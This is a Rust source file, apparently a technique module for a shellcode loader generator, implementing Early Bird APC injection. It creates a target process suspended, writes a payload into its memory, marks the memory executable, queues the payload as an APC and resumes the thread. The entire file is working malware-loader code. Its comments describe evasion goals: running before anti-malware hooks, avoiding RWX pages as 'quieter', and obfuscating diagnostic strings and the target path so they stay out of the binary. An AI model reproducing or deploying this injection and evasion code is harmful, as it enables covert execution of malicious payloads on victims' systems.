// --- Early Bird APC injection (technique fragment) ---
//
// This file is injected verbatim into the generated stub's `mod step_<index>`
// when the technique is selected, so it is self-contained: its own `use`
// statements, constants and helpers, all resolved inside that module.
//
// Per-build values use the technique's placeholder tokens, substituted by
// `Params::render_fragment_for` (see `mod.rs`); the tokens are not valid Rust
// identifiers, so nothing can rewrite them silently. Do not switch back to
// double-brace placeholders: those are valid Rust (nested blocks), and tooling
// reformats them into something the substitution no longer matches.
//
// The flow is the classic Early Bird shape:
//
//   1. `CreateProcessA(target, CREATE_SUSPENDED)` — the target's main thread is
//      parked before ntdll's `LdrInitializeThunk` has run.
//   2. `nt_alloc_vm` a `PAGE_READWRITE` region in the target (never RWX),
//      `nt_write_vm` the payload into it and `nt_protect_vm` it to
//      read+execute.
//   3. `nt_queue_apc` the payload as a user APC on the target's main thread.
//      The thread is still suspended, so the APC is first in its queue.
//   4. `nt_resume_thread`. The target's loader delivers the APC during its own
//      initialization (`LdrInitializeThunk` flushes the queue before the
//      image's entry point), which is the technique's selling point: the
//      payload runs before the target's code — and before the anti-malware
//      hooks that are placed around the entry point.
//
// Two contracts this fragment has to respect, both documented in the README:
//
//   - The APC routine is the payload itself, so the payload is entered as the
//     routine the kernel calls with the queued argument(s). It must therefore
//     be position-independent code that either returns to the APC dispatcher,
//     calls `ExitProcess`/`ExitThread` or never returns. The queued arguments
//     are all null and ignored here, and the Win32 fallback of `nt_queue_apc`
//     carries only the first of the native call's three arguments.
//   - The payload runs in *another* process, so its own exit code is not
//     observable. The loader optionally waits for the *target* to exit, for the
//     configured `wait_ms` bound, and reports the target's exit status; a chain
//     is never blocked on the target unless the plan asks for it.
//
// Every diagnostic goes through a message placeholder (rebuilt at run time by
// the renderer), and so does the target path: none of them may appear in the
// artifact's `.rdata`.

use core::ffi::c_void;
use core::ptr;

use windows::core::{PCSTR, PSTR};
use windows::Win32::Foundation::BOOL;
use windows::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
};
use windows::Win32::System::Threading::{
    CreateProcessA, GetExitCodeProcess, CREATE_SUSPENDED, PROCESS_INFORMATION, STARTUPINFOA,
};

/// `STILL_ACTIVE`: the value Windows reports for a process that has not exited.
/// Returned when the target's exit was not observed — no wait was requested, or
/// the bounded wait timed out. (A target that genuinely exits with 259 is
/// indistinguishable; the debug log is the authority.)
const STILL_ACTIVE: i32 = 259;

/// `WAIT_TIMEOUT`/`STATUS_TIMEOUT` (`0x102`): the bounded wait expired. The two
/// syscall-layer modes agree on the value.
const WAIT_TIMEOUT_CODE: i32 = 0x102;

/// Appends a status to a label (which is rebuilt from obfuscated bytes at the
/// call site, so this literal carries no diagnostic text).
fn nt_error(label: String, status: i32) -> String {
    format!("{label} (0x{:08x})", status as u32)
}

/// Deploys the payload into the already-created, suspended target and resumes
/// it; returns the code documented in the README:
///
/// - `wait_ms == 0`: `STILL_ACTIVE` (the target was not observed to exit),
/// - the target exited in the window: the target's exit status,
/// - the window expired: `STILL_ACTIVE`.
///
/// Split from `execute_payload` so the caller can release the target's handles
/// on every path, including failures.
fn deploy(info: &PROCESS_INFORMATION, image: &[u8], wait_ms: u32) -> Result<i32, String> {
    // SAFETY: the function only calls the syscall layer's `nt_*` helpers and
    // `GetExitCodeProcess` on the handles `CreateProcessA` produced. Every
    // pointer either points into `image`/`info` (alive for the call) or is an
    // out-parameter initialized here. No cleanup is done before returning:
    // `execute_payload` owns the handles.
    unsafe {
        let process = info.hProcess;

        // `PAGE_READWRITE`, never RWX: the region is made executable only once
        // the payload is in place.
        let mut base: *mut c_void = ptr::null_mut();
        let mut region = image.len();
        let status = crate::nt_alloc_vm(
            process,
            &mut base,
            0,
            &mut region,
            MEM_COMMIT.0 | MEM_RESERVE.0,
            PAGE_READWRITE.0,
        );
        if status < 0 {
            return Err(nt_error($MSG_ALLOC_FAILED$, status));
        }

        let mut written = 0usize;
        let status = crate::nt_write_vm(
            process,
            base as *const c_void,
            image.as_ptr() as *const c_void,
            image.len(),
            &mut written,
        );
        if status < 0 {
            return Err(nt_error($MSG_WRITE_FAILED$, status));
        }
        if written != image.len() {
            // A partial write would leave the target executing whatever follows
            // the copied prefix. Never resume for this.
            return Err($MSG_WRITE_SHORT$);
        }

        // Read+execute is enough for a code blob and is the quieter pair than
        // RWX. A payload that needs to write to its own image is out of scope.
        let mut old_protect = 0u32;
        let status = crate::nt_protect_vm(
            process,
            base,
            region,
            PAGE_EXECUTE_READ.0,
            &mut old_protect,
        );
        if status < 0 {
            return Err(nt_error($MSG_PROTECT_FAILED$, status));
        }

        // The APC routine *is* the payload: the target's thread enters the
        // region when the APC is delivered. All three arguments are null; a
        // payload that wants a configuration block cannot be described here.
        let status = crate::nt_queue_apc(
            info.hThread,
            base as *const c_void,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
        );
        if status < 0 {
            return Err(nt_error($MSG_APC_FAILED$, status));
        }

        let status = crate::nt_resume_thread(info.hThread, ptr::null_mut());
        if status < 0 {
            return Err(nt_error($MSG_RESUME_FAILED$, status));
        }
        crate::tech_dbg!(
            "early_bird",
            "payload at {base:p} ({region} bytes) queued as an APC; the target's loader delivers it"
        );

        if wait_ms == 0 {
            // Fire and forget: the target's exit cannot be observed later, and
            // a real payload is expected to keep the target alive.
            return Ok(STILL_ACTIVE);
        }

        // Waiting on the *process* (not the main thread) catches both a payload
        // that calls `ExitProcess` and one that crashes the target.
        let status = crate::nt_wait_for_single_object(process, wait_ms);
        if status == WAIT_TIMEOUT_CODE {
            crate::tech_dbg!(
                "early_bird",
                "the target is still running after {wait_ms} ms (the payload may be alive)"
            );
            return Ok(STILL_ACTIVE);
        }
        if status != 0 {
            return Err(nt_error($MSG_WAIT_FAILED$, status));
        }

        let mut code = 0u32;
        GetExitCodeProcess(process, &mut code)
            .map_err(|e| nt_error($MSG_EXIT_CODE_FAILED$, e.code().0))?;
        crate::tech_dbg!(
            "early_bird",
            "the target exited with status 0x{:08X} while the loader waited",
            code
        );
        Ok(code as i32)
    }
}

/// Adapter expected by the stub skeleton: creates the configured target
/// suspended, deploys the payload into it and resumes it.
pub fn execute_payload(image: &mut [u8]) -> Result<i32, String> {
    // The format guard is substituted as a boolean literal: `true` for a
    // shellcode payload, `false` otherwise. The branch body still has to
    // type-check in both cases, so the (obfuscated) message is substituted
    // either way and folded away when the branch is dead.
    if !$SUPPORTED_FORMAT$ {
        return Err($MSG_UNSUPPORTED_FORMAT$);
    }
    if image.is_empty() {
        return Err($MSG_EMPTY$);
    }

    // `CreateProcessA` takes mutable, NUL-terminated buffers: the application
    // name and the command line. The command line is the target's own path —
    // the payload's `build.payloads.*.args` cannot be delivered this way (they
    // are patched into the *loader's* PEB, see the README), and handing the
    // target a foreign command line would only make it look wrong.
    let target: String = $TARGET_DEF$;
    let mut app = target.as_bytes().to_vec();
    app.push(0);
    let mut command = target.as_bytes().to_vec();
    command.push(0);

    let mut startup: STARTUPINFOA = unsafe { core::mem::zeroed() };
    startup.cb = core::mem::size_of::<STARTUPINFOA>() as u32;
    let mut info: PROCESS_INFORMATION = unsafe { core::mem::zeroed() };

    // SAFETY: `app`/`command` are NUL-terminated and outlive the call, `startup`
    // is initialized per the API contract (`cb` is set), and `info` is written
    // by the call. `CREATE_SUSPENDED` parks the target's main thread before its
    // loader runs, which is what puts the injected APC first in the queue.
    unsafe {
        CreateProcessA(
            PCSTR(app.as_ptr()),
            PSTR(command.as_mut_ptr()),
            None,
            None,
            BOOL(0),
            CREATE_SUSPENDED,
            None,
            PCSTR::null(),
            &startup,
            &mut info,
        )
        .map_err(|e| nt_error($MSG_CREATE_FAILED$, e.code().0))?;
    }

    crate::tech_dbg!(
        "early_bird",
        "target created suspended (pid {})",
        info.dwProcessId
    );
    crate::tech_dbg!(
        "early_bird",
        "handles: process {:#x} thread {:#x}",
        info.hProcess.0 as usize,
        info.hThread.0 as usize
    );

    let result = deploy(&info, image, $WAIT_MS$);

    // A failed deployment must not leave a suspended process holding the
    // payload. Resuming it lets the target run as the empty (but legitimate)
    // process it would have been; the second resume on a healthy path never
    // happens, because `deploy` already resumed there. Closing the handles does
    // not end the target: a payload that is alive keeps its own image.
    if result.is_err() {
        let _ = unsafe { crate::nt_resume_thread(info.hThread, ptr::null_mut()) };
    }
    let _ = unsafe { crate::nt_close(info.hThread) };
    let _ = unsafe { crate::nt_close(info.hProcess) };

    result
}
